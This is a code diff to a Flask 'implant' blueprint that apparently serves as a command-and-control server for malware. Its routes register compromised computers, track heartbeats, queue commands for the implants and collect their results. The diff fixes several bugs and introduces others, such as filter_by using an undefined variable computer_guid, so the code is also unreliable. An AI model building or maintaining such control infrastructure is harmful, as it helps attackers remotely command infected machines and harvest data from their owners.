@@ -22,6 +22,7 @@ bp = Blueprint('implant', __name__)
 def register():
     try:
         if request.method == 'POST':
+            print(request.json)
             imp_id = request.json['computer_guid']
             now = datetime.now()
             current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
@@ -41,7 +42,7 @@ def register():
 
             if error is None:
                 try:
-                    implant = Implant.query.filter(computer_guid=imp_id)
+                    implant = Implant.query.filter_by(computer_guid=computer_guid)
                     if implant:
                         implant.computer_name = cmp_name
                         implant.computer_user = user_name
@@ -68,7 +69,7 @@ def register():
                         print("Implant added")
                         return jsonify({"status":"good job"})
                 except Exception as e:
-                    print(e)
+                    print("Register error" , e)
 
                     return jsonify({"status":"bad job"})
 
@@ -79,11 +80,10 @@ def register():
 
             flash(error)
     except Exception as e:
-        print(e)
+        print("Register error" , e)
 
         return jsonify({"status":"bad job"})
 
-        print("error")
         pass
 
 
@@ -94,7 +94,7 @@ def get_next_command():
             impl_id = request.json["computer_guid"]
 
             if impl_id:
-                commands = Command.query.filter(
+                commands = Command.query.filter_by(
                     computer_guid=impl_id, status="not_taken_by_implant")
                 if commands:
                     first_value = commands.first()
@@ -124,7 +124,7 @@ def store_command_results():
             result = request.json["result"]
 
             if impl_id:
-                commands = Command.query.filter(computer_guid=impl_id, status="taken_by_implant",
+                commands = Command.query.filter_by(computer_guid=impl_id, status="taken_by_implant",
                                                 command_id=cmd_id)
                 if commands:
                     commands.command_result = result
@@ -140,13 +140,13 @@ def store_command_results():
             pass
 
 
-@bp.route('/hearbeat', methods=['POST'])
+@bp.route('/heartbeat', methods=['POST'])
 def heartbeat():
     if request.method == 'POST':
         try:
             imp_id = request.json['computer_guid']
             try:
-                implant = Implant.query.filter(computer_guid=imp_id)
+                implant = Implant.query.filter_by(computer_guid=imp_id)
                 now = datetime.now()
                 current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                 implant.last_seen = current_date_time
@@ -167,7 +167,7 @@ def alert():
     if request.method == 'POST':
         try:
             imp_id = request.json['computer_guid']
-            alert = request.json['alert']
+            alert = request.json['error']
             try:
                 now = datetime.now()
                 current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
